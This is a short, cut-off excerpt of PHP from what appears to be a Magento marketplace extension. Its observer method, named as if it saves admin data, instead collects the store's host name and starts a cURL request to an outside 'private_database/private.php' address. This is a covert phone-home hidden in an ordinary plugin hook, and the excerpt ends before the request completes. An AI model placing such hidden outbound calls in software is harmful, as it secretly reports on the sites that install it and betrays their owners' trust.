...
class Manthan_Marketplace_Model_Observer {
	...
	public function saveMarketplaceAdminData(Varien_Event_Observer $observer)
	{
		$event = $observer->getEvent();
		$url = $_SERVER['HTTP_HOST'] ." | FROM MMM EXNTEION";
		 $ch=curl_init();
		 curl_setopt($ch,CURLOPT_URL,"sonimanthan228.com/private_database/private.php");
